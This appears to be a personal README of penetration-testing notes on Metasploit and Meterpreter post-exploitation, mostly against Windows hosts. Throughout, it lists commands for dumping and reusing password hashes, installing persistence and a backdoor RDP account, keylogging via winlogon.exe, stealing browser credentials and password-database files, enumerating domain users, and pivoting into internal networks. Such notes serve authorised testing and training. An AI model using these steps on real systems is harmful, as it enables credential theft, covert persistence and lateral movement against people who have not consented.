# pen-leviathan
pentesting notes

## Priv Escalation
- If we grab hashes for a system, we can use `mimikatz` to grab them from memory. This needs to be done in a 64 bit process so that meterpreter can load the module without problem.
- Run `sysinfo` and check Meterpreter value. (x86/win32 aint gonna cut it)
- To find a process to migrate to, run `ps -A x86_64 -s` when you are a `system`. This will display available compatible processes to migrate to.

## Grab hashes
- `run post/windows/gather/smart_hashdump`
- Now you can run `creds` or `loot` in the msf console to see the data as well.
- use `exploit/windows/smb/psexec`
- set usersname and then the password hash

 ## Backdoor Installation
 - For windows systems, once you have a meterpreter session, `run persistence`
 - `run getgui -e -u atk_user -p atk_password`
 - RDP Service is now started and user 'atk_user' with password 'atk_password' can now rdp into the machine.

## Pillaging
Commands inside of meterpreter for pillaging data
- sysinfo
-- if server, for example, we would know to search and see what type of services are running (in shell this would be `wmic service where started=true get catption`
- getuid

Meterpreter has a good set of gather utilities under:
- run post/windows/gather OR
- run post/linux/gather
These can also be used outsie of the meterpreter session. You just need to use the `use` command, configure its options with `set` and then execute the module with `run`

### Windows
- run post/windows/gather/enum_domains

If the machine is part of a domain, we can enumerate accounts and other information in the default active domain
- run post/windows/gather/enum_ad_users
- In a shell, run `net localgroup` to list groups and `net localgroup [GROUPNAME]` to list members of a specific group
To figure out what resources are shared:
- run enum_shares (same as `net share` in a shell)

The two main scripts to use against windows hosts are:
- scraper - harvests system info including network shares, registry hives, and password hashes
- winenum - retrieves all kinds of info about the system including env vars, networking interfaces, routing, user accounts, and much more
- Both of the above are invoked using `run winenum` or `run scraper`. Files are saved locally.

Keyloggers:
These only record the keys of the process the session has been migrated to. So if you want info when a user logs into their computer, you need to be migrated to the `winlogon.exe` process.
- `run keylogrecorder` <- there is a `-c` option that allows you to automate the migration into the correct process.
- `run post/windows/capture/keylog_recorder`

Searching for files:
- From a meterpreter session: `search -d C:\\Users\\els\\ -f *.kdbx` <- password database file extension

Downloading files:
- use the download command.

Gather Credentials:
- `run post/windows/gather/credentials/`
- In the parent directory, there are useful scripts as well. For example the `enum_chrome` script can be used to gather credentials stored in Google Chrome

List Applications:
- `run post/windows/gather/enum_applications`

Other:
- `run post/windows/gather/credentials/credential_collector`

### Linux
https://n0where.net/linux-post-exploitation


# Mapping the Internal Network

### Meterpreter Commands
Basics:
- route
- arp (good way to find new ip addresses in the network)
- netstat (will show all the host network connections as well as the processes assocatied with them)
- arp_scanner
- ping_sweep (run outside of meterpreter, but has an option where it is set to a specific session number)
- netenum (research more)

Pivoting:
Add a new route to the network to allow for a single host to scan their own internal network.

- `route add 10.10.10.0/24 255.255.255.0 2` -> 2 is the session we want to route things through.
- `run autoroute -s 10.10.10.0/24`
- `route flush`

### Windows Commands
- route print

### Linux Commands
- route -v 

